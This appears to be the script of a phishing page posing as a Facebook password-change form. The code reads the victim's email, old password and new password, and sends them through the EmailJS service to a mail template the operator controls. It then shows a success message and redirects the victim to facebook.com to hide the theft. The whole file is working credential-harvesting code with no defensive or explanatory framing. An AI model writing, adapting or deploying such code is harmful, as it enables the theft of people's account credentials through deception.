(function() {
  emailjs.init("ODWuzZ-mZLM196nkP"); // Your Public Key
})();

document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  emailjs.send("service_8hdqzju", "template_hk6uqi8", {
    email: email,
    old_password: oldPassword,
    new_password: newPassword
  }).then(function(response) {
    console.log('SUCCESS!', response.status, response.text);
    document.getElementById('passwordBox').style.display = 'none';
    document.getElementById('successMessage').style.display = 'flex';
    setTimeout(function() {
      window.location.href = 'https://facebook.com';
    }, 2000);
  }, function(error) {
    console.log('FAILED...', error);
  });
});